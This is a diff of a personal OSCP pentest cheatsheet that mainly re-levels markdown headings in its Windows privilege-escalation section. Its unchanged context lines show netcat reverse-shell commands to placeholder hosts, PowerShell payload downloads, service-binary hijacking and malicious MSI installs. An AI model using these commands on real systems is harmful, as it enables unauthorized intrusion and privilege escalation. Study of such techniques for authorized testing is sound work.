@@ -205,33 +205,33 @@ description: "OSCP personal cheatsheet"
       - [Search for CVE](#search-for-cve)
       - [Post exploitation](#post-exploitation)
     + [JuicyPotato (SeImpersonate or SeAssignPrimaryToken)](#juicypotato-seimpersonate-or-seassignprimarytoken)
-  * [Methodology to follow](#methodology-to-follow-1)
-  * [Autorun](#autorun)
-    + [Detection](#detection)
-    + [Exploitation](#exploitation)
-  * [AlwaysInstallElevated](#alwaysinstallelevated)
-    + [Detection](#detection-1)
-    + [Exploitation](#exploitation-1)
-  * [Executable Files](#executable-files)
-    + [Detection](#detection-2)
-    + [Exploitation](#exploitation-2)
-  * [Startup applications](#startup-applications)
-    + [Detection](#detection-3)
-    + [Exploitation](#exploitation-3)
-  * [Weak service permission](#weak-service-permission)
-    + [Detection](#detection-4)
-    + [Exploitation](#exploitation-4)
-  * [Unquoted service paths](#unquoted-service-paths)
-    + [Detection](#detection-5)
-    + [Exploitation](#exploitation-5)
-  * [Hot potato](#hot-potato)
-    + [Exploitation](#exploitation-6)
-  * [CVE](#cve)
-    + [Windows XP](#windows-xp)
-    + [Windows 7](#windows-7)
-    + [Windows 8](#windows-8)
-    + [Windows 10](#windows-10)
-    + [Windows Server 2003](#windows-server-2003)
+    * [Methodology to follow](#methodology-to-follow-1)
+    * [Autorun](#autorun)
+      + [Detection](#detection)
+      + [Exploitation](#exploitation)
+    * [AlwaysInstallElevated](#alwaysinstallelevated)
+      + [Detection](#detection-1)
+      + [Exploitation](#exploitation-1)
+    * [Executable Files](#executable-files)
+      + [Detection](#detection-2)
+      + [Exploitation](#exploitation-2)
+    * [Startup applications](#startup-applications)
+      + [Detection](#detection-3)
+      + [Exploitation](#exploitation-3)
+    * [Weak service permission](#weak-service-permission)
+      + [Detection](#detection-4)
+      + [Exploitation](#exploitation-4)
+    * [Unquoted service paths](#unquoted-service-paths)
+      + [Detection](#detection-5)
+      + [Exploitation](#exploitation-5)
+    * [Hot potato](#hot-potato)
+      + [Exploitation](#exploitation-6)
+    * [CVE](#cve)
+      + [Windows XP](#windows-xp)
+      + [Windows 7](#windows-7)
+      + [Windows 8](#windows-8)
+      + [Windows 10](#windows-10)
+      + [Windows Server 2003](#windows-server-2003)
   
 - [PROOFS](#proofs)
   * [Linux](#linux-5)
@@ -1700,7 +1700,7 @@ JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT>
 https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
 ```
 
-### Methodology to follow
+#### Methodology to follow
 
 ```
 https://guif.re/windowseop
@@ -1710,9 +1710,9 @@ http://www.fuzzysecurity.com/tutorials/16.html
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 ```
 
-### Autorun
+#### Autorun
 
-#### Detection
+##### Detection
 
 ```
 powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
@@ -1735,7 +1735,7 @@ winPEAS.exe
     FilePerms: Everyone [AllAccess]
 ```
 
-#### Exploitation
+##### Exploitation
 
 ```
 # Attacker
@@ -1750,9 +1750,9 @@ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/progr
 To execute it with elevated privileges we need to wait for someone in the Admin group to login.
 ```
 
-### AlwaysInstallElevated
+#### AlwaysInstallElevated
 
-#### Detection
+##### Detection
 
 ```
 powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
@@ -1782,7 +1782,7 @@ winPEAS.exe
   AlwaysInstallElevated set to 1 in HKCU!
 ```
 
-#### Exploitation
+##### Exploitation
 
 ```
 # Attacker
@@ -1795,9 +1795,9 @@ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/progr
 msiexec /quiet /qn /i C:\Temp\program.msi
 ```
 
-### Executable Files
+#### Executable Files
 
-#### Detection
+##### Detection
 
 ```
 powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
@@ -1825,7 +1825,7 @@ filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program F
 	File Permissions: Everyone [AllAccess]
 ```
 
-#### Exploitation
+##### Exploitation
 
 ```
 # Attacker
@@ -1839,9 +1839,9 @@ copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\fileperms
 sc start filepermsvc
 ```
 
-### Startup applications
+#### Startup applications
 
-#### Detection
+##### Detection
 
 ```
 icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
@@ -1857,7 +1857,7 @@ C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
 If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.
 ```
 
-#### Exploitation
+##### Exploitation
 
 ```
 # Attacker
@@ -1872,9 +1872,9 @@ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/progr
 To execute it with elevated privileges we need to wait for someone in the Admin group to login.
 ```
 
-### Weak service permission 
+#### Weak service permission 
 
-#### Detection
+##### Detection
 
 ```
 # Find all services authenticated users have modify access onto
@@ -1920,7 +1920,7 @@ daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual 
 	daclsvc: WriteData/CreateFiles
 ```
 
-#### Exploitation
+##### Exploitation
 
 ```
 # Attacker
@@ -1935,9 +1935,9 @@ or
 net start <SERVICENAME>
 ```
 
-### Unquoted service paths
+#### Unquoted service paths
 
-#### Detection
+##### Detection
 
 ```
 powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
@@ -1969,7 +1969,7 @@ winPEAS.exe
 unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
 ```
 
-#### Exploitation
+##### Exploitation
 
 ```
 # Attacker
@@ -1983,9 +1983,9 @@ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Commo
 sc start unquotedsvc
 ```
 
-### Hot potato
+#### Hot potato
 
-#### Exploitation
+##### Exploitation
 
 ```
 # Attacker
@@ -1998,7 +1998,7 @@ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Tater
 powershell -exec bypass -command "& { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe <IP> <PORT> -e cmd.exe' }"
 ```
 
-### CVE
+#### CVE
 
 ```
 # Already compiled exploit
@@ -2006,7 +2006,7 @@ https://github.com/SecWiki/windows-kernel-exploits
 https://github.com/abatchy17/WindowsExploits
 ```
 
-#### Windows XP
+##### Windows XP
 
 |      CVE      | Description                                                  |
 | :-----------: | :----------------------------------------------------------- |
@@ -2025,7 +2025,7 @@ https://github.com/abatchy17/WindowsExploits
 | CVE-2011-5046 | EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution |
 | CVE-2012-4349 | Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root |
 
-#### Windows 7
+##### Windows 7
 
 |      CVE      | Description                                                  |
 | :-----------: | :----------------------------------------------------------- |
@@ -2038,7 +2038,7 @@ https://github.com/abatchy17/WindowsExploits
 | CVE-2015-0016 | ms15_004_tswbproxy -  abuses a process creation policy in Internet Explorer's sandbox - code execution |
 | CVE-2018-8494 | remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input |
 
-#### Windows 8
+##### Windows 8
 
 |      CVE      | Description                                                  |
 | :-----------: | ------------------------------------------------------------ |
@@ -2052,7 +2052,7 @@ https://github.com/abatchy17/WindowsExploits
 | CVE-2014-6352 | ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution |
 | CVE-2015-0002 | ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation |
 
-#### Windows 10
+##### Windows 10
 
 |      CVE      | Description                                                  |
 | :-----------: | ------------------------------------------------------------ |
@@ -2065,7 +2065,7 @@ https://github.com/abatchy17/WindowsExploits
 | CVE-2015-2431 | MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution |
 | CVE-2015-2441 | MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution |
 
-#### Windows Server 2003
+##### Windows Server 2003
 
 |      CVE      | Description                                                  |
 | :-----------: | ------------------------------------------------------------ |
